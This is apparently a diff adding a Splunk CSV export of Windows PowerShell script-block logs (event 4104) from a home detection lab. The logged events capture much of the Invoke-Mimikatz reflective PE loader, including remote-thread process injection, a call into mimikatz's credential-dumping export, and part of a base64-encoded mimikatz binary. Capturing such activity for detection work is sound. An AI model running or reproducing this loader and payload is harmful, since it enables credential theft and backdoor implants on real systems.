+					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
+					Write-Verbose ""EXE thread has completed.""
+					break
+				}
+				else
+				{
+					Start-Sleep -Seconds 1
+				}
+			}
+		}
+		
+		return @($PEInfo.PEHandle, $EffectivePEHandle)
+	}
+	
+	
+	Function Invoke-MemoryFreeLibrary
+	{
+		Param(
+		[Parameter(Position=0, Mandatory=$true)]
+		[IntPtr]
+		$PEHandle
+		)
+		
+		#Get Win32 constants and functions
+		$Win32Constants = Get-Win32Constants
+		$Win32Functions = Get-Win32Functions
+		$Win32Types = Get-Win32Types
+		
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		
+		#Call FreeLibrary for all the imports of the DLL
+		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
+		{
+			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
+			
+			while ($true)
+			{
+				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
+				
+				#If the structure is null, it signals that this is the end of the array
+				if ($ImportDescriptor.Characteristics -eq 0 `
+						-and $ImportDescriptor.FirstThunk -eq 0 `
+						-and $ImportDescriptor.ForwarderChain -eq 0 `
+						-and $ImportDescriptor.Name -eq 0 `
+						-and $ImportDescriptor.TimeDateStamp -eq 0)
+				{
+					Write-Verbose ""Done unloading the libraries needed by the PE""
+					break
+				}
+
+				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
+				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)
+
+				if ($ImportDllHandle -eq $null)
+				{
+					Write-Warning ""Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways"" -WarningAction Continue
+				}
+				
+				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
+				if ($Success -eq $false)
+				{
+					Write-Warning ""Unable to free library: $ImportDllPath. Continuing anyways."" -WarningAction Continue
+				}
+				
+				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
+			}
+		}
+		
+		#Call DllMain with process detach
+		Write-Verbose ""Calling dllmain so the DLL knows it is being unloaded""
+		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
+		
+		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
+		
+		
+		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
+		if ($Success -eq $false)
+		{
+			Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
+		}
+	}
+
+
+	Function Main
+	{
+		$Win32Functions = Get-Win32Functions
+		$Win32Types = Get-Win32Types
+		$Win32Constants =  Get-Win32Constants
+		
+		$RemoteProcHandle = [IntPtr]::Zero
+	
+		#If a remote process to inject in to is specified, get a handle to it
+		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
+		{
+			Throw ""Can't supply a ProcId and ProcName, choose one or the other""
+		}
+		elseif ($ProcName -ne $null -and $ProcName -ne """")
+		{
+			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
+			if ($Processes.Count -eq 0)
+			{
+				Throw ""Can't find process $ProcName""
+			}
+			elseif ($Processes.Count -gt 1)
+			{
+				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
+				Write-Output $ProcInfo
+				Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
+			}
+			else
+			{
+				$ProcId = $Processes[0].ID
+			}
+		}
+		
+		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
+		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
+#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
+#		{
+#			Write-Verbose ""Getting SeDebugPrivilege""
+#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
+#		}	
+		
+		if (($ProcId -ne $null) -and ($ProcId -ne 0))
+		{
+			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
+			if ($RemoteProcHandle -eq [IntPtr]::Zero)
+			{
+				Throw ""Couldn't obtain the handle for process ID: $ProcId""
+			}
+			
+			Write-Verbose ""Got the handle for the remote process to inject in to""
+		}
+		
+
+		#Load the PE reflectively
+		Write-Verbose ""Calling Invoke-MemoryLoadLibrary""
+
+        try
+        {
+            $Processors = Get-WmiObject -Class Win32_Processor
+        }
+        catch
+        {
+            throw ($_.Exception)
+        }
+
+        if ($Processors -is [array])
+        {
+            $Processor = $Processors[0]
+        } else {
+            $Processor = $Processors
+        }
+
+        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
+        {
+            Write-Verbose ( ""Architecture: "" + $Processor.AddressWidth + "" Process: "" + ([System.IntPtr]::Size * 8))
+            Write-Error ""PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS."" -ErrorAction Stop
+        }
+
+        #Determine whether or not to use 32bit or 64bit bytes
+        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
+        {
+            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
+        }
+        else
+        {
+            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
+        }
+        $PEBytes[0] = 0
+        $PEBytes[1] = 0
+		$PEHandle = [IntPtr]::Zero
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
+		}
+		else
+		{
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
+		}
+		if ($PELoadedInfo -eq [IntPtr]::Zero)
+		{
+			Throw ""Unable to load PE, handle returned is NULL""
+		}
+		
+		$PEHandle = $PELoadedInfo[0]
+		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
+		
+		
+		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
+		{
+			#########################################
+			### YOUR CODE GOES HERE
+			#########################################
+                    Write-Verbose ""Calling function with WString return type""
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""powershell_reflective_mimikatz""
+				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
+				    {
+					    Throw ""Couldn't find function address.""
+				    }
+				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
+				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
+                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
+				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
+				    if ($OutputPtr -eq [IntPtr]::Zero)
+				    {
+				    	Throw ""Unable to get output, Output Ptr is NULL""
+				    }
+				    else
+				    {
+				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
+				        Write-Output $Output
+				        $Win32Functions.LocalFree.Invoke($OutputPtr);
+				    }
+			#########################################
+			### END OF YOUR CODE
+			#########################################
+		}
+		#For remote DLL injection, call a void function which takes no parameters
+		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
+			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
+			{
+				Throw ""VoidFunc couldn't be found in the DLL""
+			}
+			
+			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
+			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
+			
+			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+		}
+		
+		#Don't free a library if it is injected in a remote process
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
+		}
+		else
+		{
+			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
+			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
+			if ($Success -eq $false)
+			{
+				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
+			}
+		}
+		
+		Write-Verbose ""Done!""
+	}
+
+	Main
+}
+438f26a2-c819-4c7b-8c04-cf51a6b39a9d","2025-11-23T14:38:46.688+0000",,,Execute,,"DESKTOP-78CU07R","DESKTOP-78CU07R",,328,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",328,"mydfir-project",,392,,,,,,,"//_::._=--/===-==-------==--====___=__=________.__",,,,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,,,,,"Microsoft Windows",
+,,,,,,"DESKTOP-78CU07R",,,,,,,,,,4104,3,,,,,,,,,,,"'
+
+  	# mimikatz 2.2.0 (win 32) #18362
+    # SHA256 hash: 08AB87667A5C6EB25DDB1BD659613EF8C773526AE28B191C34E854CD6F13F8D4 
+    # VirusTotal Analysis: no signature yet ;)
+    $PEBytes32 = '",None,"Microsoft-Windows-PowerShell/Operational",,,,Splunk,,,On,,,,,,,,,,,,,,,,,,227,,,,,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell",,,Execute,,Warning,,"NOT_TRANSLATED",,,,,,,,,"11/23/2025 08:38:46.648 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=227
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.
+
+FormatMessage error:
+
+Got the following information from this event: 
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0AoABAEAAEChSKFooXCheKGAoZihoKGoodii8KL4ooijkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKoAAADgCgAQAAAAOKFAoUihAAAA8AoAEAEAANCg4KDwoPigAKEIoRChGKEgoSihOKFAoUihUKFYoWChaKFwoYihmKGgoaihsKG4oYCjiKOQo5ijoKOoo7CjuKPAo8ij0KPYo+Cj6KPwo/ijAKQIpBCkGKQgpCikMKQ4pECkSKRQpFikYKRopHCkeKSApIikkKSYpKCkqKSwpLikwKTIpNCk4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeCl6KXwpfilAKYIphCmGKYgpiimMKY4pgCqCKoQqhiqIKooqjCqOKpAqkiqUKpYqmCqaKpwqniqgKqIqpCqmKoAAAAACwDAAAAA8Kn4qQCqCKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwAQCwAgAQAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKSYpKikuKTIpNik6KT4pAilGKUopTilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3iniKeYp6inuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qAAgCwBsAQAA4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKygrLCswKzQrOCs8KwArRCtIK0wrUCtUK1grXCtgK2QraCtsK3ArdCt4K3wrQCuEK4grjCuQK5QrmCucK6ArpCuoK6wrsCu0K7grvCuAK8QryCvMK9Ar1CvYK9wr4CvkK+gr7CvwK/Qr+Cv8K8AMAsAbAAAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgonCigKKQoqCisKLAotCi4KLwogCjEKMAUAsASAAAACioMKi4rsiu2K7orviuCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvoK+wr8Cv0K/gr/CvAAAAYAsA/AEAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgoniiiKK4osCiyKLQotii4KLoovCi+KIAowijEKMYoyCjKKMwozijQKNIo1CjWKNgo3CjgKOQo6CjsKPAo9CjYKRopHCkeKSApIikkKSYpKCkqKSwpLikQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZopnCmeKaApoimkKaYpqCmqKawprimwKbIptCm2Kbgpuim8Kb4pgCnCKcQpxinIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKywrLiswKzIrNCs4KzorPCs+KwArQitEK0YrSCtKK0wrTitQK1IrWiteK2IraCt8K74rgCvCK8wr6ivsK+4r8Cv0K/Yr+Cv6K/wr/ivAHALAJAAAAAAoAigEKAYoCCgKKAwoDigQKBIoGCgeKCQoKigwKDYoPCgCKEgoTihUKFooYChmKGwocih4KH4oRCiKKI4osCiyKLQotii4KLoovCi+KIgoyijMKM4o2CjuKOgpKiksKTApOCkaKUgpiimMKY4pmCmuKbwqACpCKkQqRipQKkAqgiqEKoYqkCqAIALAAABAACQpZiloKWopdClgKagprCmuKbAptCm8Kawp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhQqFioYKhoqJComKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgAqQipEKkYqSCpKKkwqTipYKnYqeCp6Knwq/irAKwIrBCsKKxArFiscKyIrKCsuKzQrOisAK0YrTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitCK4QrhiuIK4orjCuOK5IrlCuWK5groCuiK6QrpiuoK6orrCuuK7Arsiu0K4AAACQCwBsAAAAaKdwp3ingKeIp5CnOKhAqEioUKhYqJiooKioqLCoCKkQqhiqIKooqjCqSKpQqliqYKpoqnCqeKqAqoiqkKqYqqCqyKrQqqitsK24rcCtyK3Qrdit4K3orfCt+K0AriiuMK4AAACgCwAcAAAAWKFoobCsuKzArMis0KzYrOCsAAAAsAsAaAEAAACnCKcQpxinIKcopzCnAKgIqBCoGKggqCioMKhwqniqgKqIqpCqmKqgqqiqsKq4qsCqyKrQqtiq4KroqvCq+KoAqwirEKsYqyCrKKtIq1CrWKtgq2ircKt4q4CriKuQq5iroKuoq7CruKvAq8ir0KvYq+Cr6Kvwq/irAKwQrCCsKKwwrDisSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitsK24rcit0K3orfCt+K0ArgiuEK4YriCuKK4wrjiuQK5IrlCuWK5grmiucK54roCuiK6QrpiuoK6orrCuuK7Arsiu0K7grgivEK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AwAsABAMAAACgCKAQoBigIKAooDCgOKBAoEigUKBooHCgeKCAoIigkKDgoOig8KD4oDChOKFAoUihUKFYoWChaKFwoXihgKGIoZChmKGgoaihsKHIoeCh6KHwofihAKIIohCiGKIgoiiiMKI4okCiSKJQoliiYKJoonCieKKAooiikKKYoqCiqKKworiiwKLIotCi2KLgouii8KL4ogCjCKMQoxijIKMoozCjOKNQo2ijcKOAo5CjmKOgo7CjuKPQo9ij8KP4oxCkGKQgpDCkOKRApFCkWKRgpHCkeKSQpJiksKS4pNCk2KTwpPikEKUYpTClOKVQpVilcKV4pZClmKWgpbCluKXApdCl2KXgpeilAKYYpjCmOKaApoimkKaYpqCmqKYApyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYpwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqLCouKjIqNCo2KjgqOio8Kj4qACpCKkQqRipIKkoqTCpOKlAqUipgKmoqbCpuKnAqcip0KnYqfCp+KkAqgiqEKoYqiCqKKowqjiqQKpIqlCqWKpgqmiqcKqAqoiqmKqgqrCquKrIqtCq4KroqviqAKsQqxirKKswqzirUKtoq3CriKugq6irsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKx4rICsiKyQrJisoKyorLCsyKzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCteK2QrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr7iv0K/Yr+Cv6K/wr/ivANALAKgCAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCQoJigoKCooLCgwKDIoOCg6KDwoPigAKEIoRihIKEwoTihSKFQoWChaKF4oYChkKGYoaihsKHIoeCh6KH4oQCiEKIYoiiiMKJAokiiYKJoonCieKKAopiioKKoorCiuKLAosii0KLYouCi6KLwoviiAKMIoxCjGKMgoyijMKM4o0CjSKNQo1ijYKNoo3CjeKOAo4ijkKOYo6CjqKOwo/ijAKQYpDCkOKRApEikUKRYpGCkaKRwpHikgKSIpJCkmKSgpKiksKS4pMCkyKTQpNik4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeilAKYIphCmGKYgpiimMKY4pkCmSKZQplimYKZopnCmeKaApoimkKaopsCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoKKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqKiosKjAqMio2KjgqPioEKkYqSCpKKkwqTipUKlwqZCpsKm4qdCp2KnwqfipEKogqiiqQKpIqlCqWKpgqniqoKqoqrCq0KrYquCq6KrwqviqAKsIqxCrGKsgqyirMKs4q0CrSKtQq1irYKtoq3CreKuAq4irkKuYq6CrqKuwq7irwKvIqwCsMKw4rECsSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rCCtKK0wrTitgK3Irdit6K34rQCuCK4A4AsAzAAAABCmGKYgpiimMKZApkimUKZYpmCmaKZwpnimgKaIppCmmKagpqimsKa4psCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoGKggqCioMKg4qECoSKhQqFioYKhoqHCoeKiAqIiokKiYqKCoqKiwqLiowKjIqNCo2KjgqOio8Kj4qACpCKkQqRipuKoA8AsAHAAAAACgCKAQoBig6KD4oAChGKEgoQAAADAQAIQAAABwobih2KH4oRiiOKJoooCiiKKQosii0KIgo1ilgKiIqJComKigqKiosKi4qMCoyKjYqOCo6KjwqPioAKkIqRCpoKmoqaCrwKvQq+irAKxArFCskKygrOCs8KwwrUCtwK3QrRCuIK5grnCusK7ArgCvEK9Qr2CvoK+wr/CvAEAQALAAAAAAoFCgYKCgoLCg4KDooPCg+KAAoQihGKFAolCikKKgouCi8KIwo0CjgKOQo9Cj4KMgpDCkcKSApMCk0KQQpSClYKVwpbClwKUAphCmUKZgpqCmsKbwpgCnOKfgp/CnkKjgqDCpgKnQqSCqcKqAqsCq0Kpgq3CrsKvAqwCsEKxQrGCs4KzwrDCtQK2ArZCt0K3grUCuWK5wrsCu0K4QryCvYK9wr7CvwK8AUBAAeAAAAACgEKBQoGCgEKEgoWChcKGwocChAKIQolCiYKKgorCi8KIAo0CjUKOQo6CjYKSwpAClUKWgpYCm0KYgp3CnwKcQqICo0KggqXCpwKkQqmCqsKoAq1CroKvwq0CskKzgrDCtgK3wrQiuUK6grvCuwK8AYBAAoAAAABCgYKCwoAChUKGgofChQKKQotCi2KLooiCjOKNwo4ij0KMgpHCkwKQQpWClsKUQphimKKaAptCmIKdwp8CnEKhgqLCo8Kj4qAipUKmQqZipqKngqeip+KlAqpCq4KpAq0irWKugq/CrMKw4rEiskKzgrDCtmK24reCtAK4orkiucK6Qrriu2K4AryCvSK9or5CvsK/Yr/ivAHAQACABAAAgoECgiKCwoLigwKDQoPigGKFgoYihkKGYoaih0KHwoRiiOKJgooCiqKLIovCiEKM4o1ijgKOgo8ij6KMQpDCkWKR4pKCkwKTopAilMKVQpXilmKXApeClCKYoplCmcKaYprim4KYApyinSKdwp5CnuKfYpwCoIKhIqGiokKiwqNio+KggqUCpaKlwqXipgKmIqbCpuKnAqcip0Kn4qQCqCKoQqhiqQKpIqlCqWKpgqoiqkKqYqqCqqKrQqtiq4KroqvCqGKsgqyirMKs4q1CrYKuAq5irqKvIq+Cr8KsQrFisoKzIrOisGK0grSitMK04rUCtaK1wrXitgK2IrZCtmK2grbityK3orQCuEK4wrkiuWK54rgAAAIAQAPQBAACYoqCiqKKworii4KLoovCi+KIAoyijMKM4o0CjSKNwo3ijgKOIo5CjuKPAo8ij0KPYowCkCKQQpBikIKRIpFCkWKRgpGikkKSYpKCkqKSwpNik4KTopPCk+KQgpSilMKU4pUClaKVwpXilgKWIpbCluKXApcil0KX4pQCmCKYQphimQKZIplCmWKZgpoimkKaYpqCmqKbYpuCm6KbwpvimAKcopzCnOKdAp0inUKdYp2CniKeQp5inoKeop7Cn2Kfgp+in8Kf4pwCoCKgQqCCoKKg4qFCoaKhwqICoiKiYqKCosKi4qMio0KjgqOio+KgAqRCpGKkoqUCpWKlgqXCpeKmIqZCpoKm4qcCp0KnYqeip8KkAqgiqGKogqjCqOKpIqlCqYKpoqniqgKqQqpiqqKrAqsiq2KrgqvCq+KoIqxCrIKsoqzirQKtQq1iraKtwq4CriKuYq6CrsKu4q8ir0Kvgq+ir+KsArBCsGKworDCsQKxYrHCseKyIrJCsoKyorLiswKzQrNis6KzwrACtCK0YrSCtMK04rUitUK1grWiteK2ArZCtmK2orbCtwK3Irdit4K3wrQiuEK4griiuOK5QrmiugK6YrrCuyK7gruiu+K4ArxCvGK8or0CvWK9wr4ivkK+4r9ivAAAAkBAAZAAAAACgIKBIoGiggKCQoKCgsKDQoOCgGKEgoSihMKE4oUChaKFwoXihgKGIoZChmKGgoaihsKG4ocChyKHQodih4KHoofCh+KEAohCiGKIgoiiiMKI4okCiSKJQogAAAAAAAAAAAAA='
+
+  	# mimikatz 2.2.0 (win 32) #18362
+    # SHA256 hash: 08AB87667A5C6EB25DDB1BD659613EF8C773526AE28B191C34E854CD6F13F8D4 
+    # VirusTotal Analysis: no signature yet ;)
+    $PEBytes32 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACLMJxxz1HyIs9R8iLPUfIie80DIsRR8iJ7zQEiWlHyInvNACLWUfIizjz2I9xR8iLOPPEj1VHyItTMbiLNUfIiqb85IstR8iJUujkizVHyIsYpcSLNUfIizjz3I+9R8iIMXq8ixVHyIsYpYSLqUfIiz1HzIvpT8iIFPPojr1HyIgU88iPOUfIiBTwNIs5R8iIFPPAjzlHyIlJpY2jPUfIiAAAAAAAAAABQRQAATAEFACuiul0AAAAAAAAAAOAAAiELAQ4XAPgIAABaBQAAAAAAoAMHAAAQAAAAEAkAAAAAEAAQAAAAAgAABQABAAAAAAAFAAEAAAAAAACADgAABAAAAAAAAAMAQAEAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAdA0AYAAAAGB0DQAwAgAAAAAOAIgCAAAAAAAAAAAAAAAAAAAAAAAAABAOAIhvAABwZw0AHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAZCQBAAAAAAAAAAAAAAAAAEAkAnAgAABxxDQBgAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAXfYIAAAQAAAA+AgAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAACKYBAAAEAkAAJoEAAD8CAAAAAAAAAAAAAAAAABAAABALmRhdGEAAAB8SgAAALANAAA6AAAAlg0AAAAAAAAAAAAAAAAAQAAAwC5yc3JjAAAAiAIAAAAADgAABAAAANANAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAIhvAAAAEA4AAHAAAADUDQAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA